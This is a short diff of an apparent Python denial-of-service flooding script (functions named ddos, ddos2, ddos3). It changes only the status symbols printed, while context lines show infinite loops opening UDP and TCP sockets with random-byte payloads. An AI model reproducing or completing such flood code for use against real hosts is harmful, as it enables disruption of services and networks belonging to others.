@@ -33,7 +33,7 @@ threads =int(input("\033[32m >>> \033[31m THREADS : => "))
 
 def ddos():
 	data = random._urandom(577)
-	i = random.choice(("[-]","[•]","[+]"))
+	i = random.choice(("[-]","[•]","[!]","[+]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -62,7 +62,7 @@ def ddos2():
 
 def ddos3():
 	data = random._urandom(1025)
-	i = random.choice(("[-]","[•]","[+]"))
+	i = random.choice(("[-]","[•]","[!]","[+]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
